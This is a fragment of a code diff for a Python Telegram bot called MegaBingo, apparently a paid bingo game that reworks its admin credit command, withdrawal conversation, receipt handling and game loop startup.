+            await context.bot.send_message(uid, AMHARIC["dep_confirmed"].format(amt=amt, bal=u.balance), parse_mode="Markdown")
+            await update.message.reply_text(f"✅ Credited {amt} to {uid}")
         db.close()
-    except: 
-        await update.message.reply_text("Admin: /admin_credit [user_id] [amount]")
-
-async def admin_debit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_CHAT_ID: return
-    try:
-        uid, amt = int(context.args[0]), float(context.args[1])
-        db = SessionLocal()
-        user = db.query(User).filter_by(telegram_id=uid).first()
-        if user:
-            user.balance -= amt
-            db.commit()
-            await update.message.reply_text(AMHARIC["success_debit"].format(amt=amt, uid=uid))
-        db.close()
-    except: 
-        await update.message.reply_text("Admin: /admin_debit [user_id] [amount]")
+    except: await update.message.reply_text("Use: `/admin_credit [ID] [Amount]`")
 
 # --- MAIN ---
 def main():
-    if not BOT_TOKEN:
-        print("Set TELEGRAM_BOT_TOKEN")
-        return
-
-    # Initialize DB and Card Templates
+    if not BOT_TOKEN: print("NO TOKEN"); return
     init_db()
-    
     app = Application.builder().token(BOT_TOKEN).build()
     
     # Handlers
-    app.add_handler(CommandHandler("start", start_cmd))
-    app.add_handler(CommandHandler("play", play_command))
-    app.add_handler(CommandHandler("rules", rules_cmd))
-    app.add_handler(CommandHandler("balance", balance_cmd))
-    app.add_handler(CommandHandler("deposit", deposit_cmd))
-    app.add_handler(CommandHandler("withdraw", withdraw_cmd))
-    app.add_handler(CommandHandler("mycard", mycard_command))
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("play", play))
+    app.add_handler(CommandHandler("quickplay", play)) # Same handler, different logic inside
+    app.add_handler(CommandHandler("deposit", deposit))
+    
+    # Withdraw Conversation
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler("withdraw", withdraw_start)],
+        states={
+            WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
+            WITHDRAW_ACCOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_account)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)]
+    )
+    app.add_handler(conv_handler)
     
     app.add_handler(CommandHandler("admin_credit", admin_credit))
-    app.add_handler(CommandHandler("admin_debit", admin_debit))
+    app.add_handler(MessageHandler(filters.PHOTO | filters.TEXT, handle_receipt))
     
-    app.add_handler(MessageHandler(filters.PHOTO & filters.ChatType.PRIVATE, receipt_handler))
-
-    # START GAME LOOP TASK
     loop = asyncio.get_event_loop()
-    loop.create_task(run_game_loop(app))
-
-    print("MegaBingo V3 Auto-Pilot Started...")
+    loop.create_task(game_engine(app))
+    
+    print("MegaBingo V5.0 LIVE...")
     app.run_polling()
 
 if __name__ == "__main__":
